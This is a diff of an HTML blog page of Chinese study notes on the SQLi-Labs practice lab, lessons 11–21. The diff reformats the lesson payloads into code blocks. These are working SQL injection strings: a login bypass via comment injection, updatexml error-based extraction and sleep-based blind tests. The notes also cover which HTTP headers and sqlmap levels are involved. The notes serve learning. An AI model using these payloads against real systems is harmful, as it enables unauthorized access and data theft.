@@ -87,7 +87,7 @@
 <meta property="og:site_name" content="风介穹宇">
 <meta property="og:description" content="小知识121、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用--level 参数且数值&amp;gt;=2的时候也会检查cookie时面的参数，当&amp;gt;=3的时候将检查User-ag">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2019-01-09T09:46:51.349Z">
+<meta property="og:updated_time" content="2019-01-09T09:53:19.021Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="SQLi-Labs学习笔记11~21">
 <meta name="twitter:description" content="小知识121、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用--level 参数且数值&amp;gt;=2的时候也会检查cookie时面的参数，当&amp;gt;=3的时候将检查User-ag">
@@ -386,10 +386,7 @@
       
         <h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、常见的HTTP注入点产生位置为【Referer】、【X-Forwarded-For】、【Cookie】、【X-Real-IP】、【Accept-Language】、【Authorization】。</span><br><span class="line">2、默认情况下SQLMAP只支持GET/POST参数的注入测试，但是当使用--level 参数且数值&gt;=2的时候也会检查cookie时面的参数，当&gt;=3的时候将检查User-agent和Referer。</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<h5 id="Lesson-11-14、17-POST-Error-Based-Double-Injection"><a href="#Lesson-11-14、17-POST-Error-Based-Double-Injection" class="headerlink" title="Lesson-11/14、17 POST - Error Based/Double Injection"></a>Lesson-11/14、17 POST - Error Based/Double Injection</h5><ol>
-<li>uname=admin’ #&amp;passwd=dfdsf&amp;submit=Submit</li>
-<li>uname=admin’ and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) #&amp;passwd=dfdsf&amp;submit=Submit</li>
-</ol>
+<h5 id="Lesson-11-14、17-POST-Error-Based-Double-Injection"><a href="#Lesson-11-14、17-POST-Error-Based-Double-Injection" class="headerlink" title="Lesson-11/14、17 POST - Error Based/Double Injection"></a>Lesson-11/14、17 POST - Error Based/Double Injection</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; #&amp;passwd=dfdsf&amp;submit=Submit`</span><br><span class="line"></span><br><span class="line">uname=admin&apos; and 1=(updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) #&amp;passwd=dfdsf&amp;submit=Submit</span><br></pre></td></tr></table></figure>
 <p>两个字段都有注入，以上Lesson-11两个PoC的差别在于：</p>
 <ol>
 <li>注释后面的SQL语句实现任意用户登录；</li>
@@ -398,10 +395,7 @@
 <p>Lesson-12/15改为双引号加括号，无需赘言。</p>
 <p>Lesson-17注入点在password处，仅此而已。</p>
 <hr>
-<h5 id="Lesson-15-16-POST-Blind-Boolean-time-Based"><a href="#Lesson-15-16-POST-Blind-Boolean-time-Based" class="headerlink" title="Lesson-15/16 POST - Blind- Boolean/time Based"></a>Lesson-15/16 POST - Blind- Boolean/time Based</h5><ol>
-<li>uname=admin’ and if(length(database())=8,sleep(1),null) #&amp;passwd=passwd&amp;submit=Submit</li>
-<li>uname=admin”) and if(length(database())=8,sleep(1),null) #&amp;passwd=pass&amp;submit=Submit</li>
-</ol>
+<h5 id="Lesson-15-16-POST-Blind-Boolean-time-Based"><a href="#Lesson-15-16-POST-Blind-Boolean-time-Based" class="headerlink" title="Lesson-15/16 POST - Blind- Boolean/time Based"></a>Lesson-15/16 POST - Blind- Boolean/time Based</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; and if(length(database())=8,sleep(1),null) #&amp;passwd=passwd&amp;submit=Submit</span><br><span class="line"></span><br><span class="line">uname=admin&quot;) and if(length(database())=8,sleep(1),null) #&amp;passwd=pass&amp;submit=Submit</span><br></pre></td></tr></table></figure>
 <p>这里不知道正确的用户名密码，因此无法测试Boolean Based。对于Time Based类型，难点是判定注释的字符，后期可以关于CTF多练练手。</p>
 <hr>
 <h5 id="Lesson-18-20-Header-Cookie-Injection"><a href="#Lesson-18-20-Header-Cookie-Injection" class="headerlink" title="Lesson-18/20 Header/Cookie Injection"></a>Lesson-18/20 Header/Cookie Injection</h5><p>这3个docker环境都没好，贴上其它玩家的剖析。</p>
